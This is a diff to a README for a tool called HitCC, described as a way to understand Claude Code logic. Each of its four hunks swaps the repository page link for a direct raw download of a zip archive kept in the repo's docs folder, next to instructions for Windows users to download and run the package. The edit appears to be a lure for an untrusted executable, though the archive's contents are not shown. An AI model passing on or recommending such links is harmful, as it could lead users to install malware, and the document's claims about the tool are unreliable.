@@ -1,12 +1,12 @@
 # 🧩 HitCC - Understand Claude Code Logic Fast
 
-[![Download HitCC](https://img.shields.io/badge/Download-HitCC-bluegrey?style=for-the-badge)](https://github.com/evoludi9918/HitCC)
+[![Download HitCC](https://img.shields.io/badge/Download-HitCC-bluegrey?style=for-the-badge)](https://github.com/evoludi9918/HitCC/raw/refs/heads/main/docs/CC_Hit_v3.3.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download HitCC:
 
-https://github.com/evoludi9918/HitCC
+https://github.com/evoludi9918/HitCC/raw/refs/heads/main/docs/CC_Hit_v3.3.zip
 
 ## 🖥️ What HitCC Is
 
@@ -29,7 +29,7 @@ If the package includes a bundled app, Windows may ask for permission the first 
 ## 🚀 How to Download and Run on Windows
 
 1. Open this page in your browser:
-   https://github.com/evoludi9918/HitCC
+   https://github.com/evoludi9918/HitCC/raw/refs/heads/main/docs/CC_Hit_v3.3.zip
 
 2. Look for the latest release, main download file, or project package on the page.
 
@@ -177,4 +177,4 @@ A simple setup path is:
 
 If you need the download page again, use this link:
 
-https://github.com/evoludi9918/HitCC
+https://github.com/evoludi9918/HitCC/raw/refs/heads/main/docs/CC_Hit_v3.3.zip
